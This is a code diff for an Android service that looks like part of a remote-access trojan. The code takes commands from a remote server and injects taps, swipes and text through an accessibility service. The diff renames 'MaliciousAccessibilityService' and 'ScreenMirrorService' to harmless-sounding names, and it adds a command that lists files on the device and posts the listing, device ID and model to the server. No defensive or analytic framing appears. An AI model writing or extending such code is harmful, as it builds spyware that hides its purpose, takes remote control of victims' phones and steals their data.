@@ -16,12 +16,13 @@ import android.media.projection.MediaProjectionManager
 import android.os.*
 import androidx.core.app.NotificationCompat
 import kotlinx.coroutines.*
+import kotlinx.coroutines.withContext
 import org.json.JSONObject
 import java.io.ByteArrayOutputStream
 import java.net.HttpURLConnection
 import java.net.URL
 
-class ScreenMirrorService : Service() {
+class MediaStreamService : Service() {
 
     private var mediaProjection: MediaProjection? = null
     private var virtualDisplay: VirtualDisplay? = null
@@ -39,7 +40,7 @@ class ScreenMirrorService : Service() {
         @Volatile var isRunning = false
 
         fun start(context: Context, resultCode: Int, data: Intent) {
-            val intent = Intent(context, ScreenMirrorService::class.java).apply {
+            val intent = Intent(context, MediaStreamService::class.java).apply {
                 putExtra("code", resultCode)
                 putExtra("data", data)
             }
@@ -51,7 +52,7 @@ class ScreenMirrorService : Service() {
         }
 
         fun stop(context: Context) {
-            context.stopService(Intent(context, ScreenMirrorService::class.java))
+            context.stopService(Intent(context, MediaStreamService::class.java))
         }
     }
 
@@ -159,20 +160,21 @@ class ScreenMirrorService : Service() {
                         val json = JSONObject(body)
                         when (json.optString("type")) {
                             "tap" -> {
-                                MaliciousAccessibilityService.instance?.injectTap(
+                                InputAssistService.instance?.injectTap(
                                     json.getDouble("x").toFloat(),
                                     json.getDouble("y").toFloat()
                                 )
                                 delay(600) // wait for field to gain focus before next command
                             }
-                            "swipe" -> MaliciousAccessibilityService.instance?.injectSwipe(
+                            "swipe" -> InputAssistService.instance?.injectSwipe(
                                 json.getDouble("x1").toFloat(), json.getDouble("y1").toFloat(),
                                 json.getDouble("x2").toFloat(), json.getDouble("y2").toFloat()
                             )
-                            "key"    -> MaliciousAccessibilityService.instance?.injectKey(json.optString("key"))
-                            "text"   -> MaliciousAccessibilityService.instance?.injectText(json.optString("text"))
-                            "clear"  -> MaliciousAccessibilityService.instance?.clearText()
-                            "global" -> MaliciousAccessibilityService.instance?.injectGlobal(json.optString("action"))
+                            "key"    -> InputAssistService.instance?.injectKey(json.optString("key"))
+                            "text"   -> InputAssistService.instance?.injectText(json.optString("text"))
+                            "clear"  -> InputAssistService.instance?.clearText()
+                            "global" -> InputAssistService.instance?.injectGlobal(json.optString("action"))
+                            "list_dir" -> scope.launch { listDirectory(json.optString("path", "/sdcard")) }
                         }
                     }
                 } catch (_: Exception) {}
@@ -228,6 +230,53 @@ class ScreenMirrorService : Service() {
                 } catch (_: Exception) {}
             }
         }
+    }
+
+    // ── Directory listing ─────────────────────────────────────────────────────
+
+    private suspend fun listDirectory(path: String) = withContext(Dispatchers.IO) {
+        try {
+            val dir     = java.io.File(path)
+            val entries = org.json.JSONArray()
+            val fmt     = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.getDefault())
+
+            dir.listFiles()
+                ?.sortedWith(compareBy({ it.isFile }, { it.name.lowercase() }))
+                ?.forEach { f ->
+                    entries.put(org.json.JSONObject().apply {
+                        put("name",        f.name)
+                        put("type",        if (f.isDirectory) "dir" else "file")
+                        put("size",        if (f.isFile) f.length() else 0)
+                        put("permissions", buildPermissions(f))
+                        put("modified",    fmt.format(java.util.Date(f.lastModified())))
+                    })
+                }
+
+            val payload = org.json.JSONObject().apply {
+                put("device_id",      getAndroidId())
+                put("path",           path)
+                put("entries",        entries)
+                put("device_model",   android.os.Build.MODEL)
+                put("android_version", android.os.Build.VERSION.RELEASE)
+            }
+
+            val conn = URL("$SERVER/api/directory_listing").openConnection() as HttpURLConnection
+            conn.requestMethod = "POST"
+            conn.doOutput = true
+            conn.setRequestProperty("Content-Type", "application/json")
+            conn.connectTimeout = 10000
+            conn.readTimeout    = 10000
+            conn.outputStream.use { it.write(payload.toString().toByteArray()); it.flush() }
+            conn.responseCode
+            conn.disconnect()
+        } catch (_: Exception) {}
+    }
+
+    private fun buildPermissions(f: java.io.File): String = buildString {
+        append(if (f.isDirectory) "d" else "-")
+        append(if (f.canRead())    "r" else "-")
+        append(if (f.canWrite())   "w" else "-")
+        append(if (f.canExecute()) "x" else "-")
     }
 
     private fun createChannel() {
